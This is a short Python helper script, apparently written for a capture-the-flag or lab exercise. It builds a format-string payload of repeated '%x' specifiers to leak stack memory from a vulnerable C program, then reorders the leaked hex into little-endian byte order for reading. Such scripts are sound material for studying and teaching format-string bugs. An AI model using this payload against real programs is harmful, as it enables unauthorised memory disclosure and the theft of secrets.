from textwrap import wrap
import codecs


def gen_exploit_input():
    """ Generates the input for the c program """
    return "%x%x%x%x%x%x%x%x%x%x%x%x"


def get_word(lst, n):
    """Yield successive n-sized chunks from lst."""
    for i in range(0, len(lst), n):
        yield lst[i:i + n]


def toggle_endianess(word):
    for i in range(len(word)//2):
        aux = word[i]
        word[i] = word[-1-i]
        word[-1-i] = aux
    return word


def get_exploit_output(output):
    """ Converts the program's output to ascii """
    word_len = 4

    # Split at every 2 characters (every byte in hex format)
    output_bytes = wrap(output, 2)
    output_little = []

    # Convert to little endian
    for word in get_word(output_bytes, word_len):
        new_word = toggle_endianess(word)
        for new_byte in new_word:
            output_little.append(new_byte)

    print("".join(output_little))
    # return bytearray.fromhex("".join(output)).decode()


if __name__ == "__main__":
    print("Put this as input for the binary:", gen_exploit_input())
    bin_output = input("Give me the binary's output:")
    print("Here's the processed output:", get_exploit_output(bin_output))
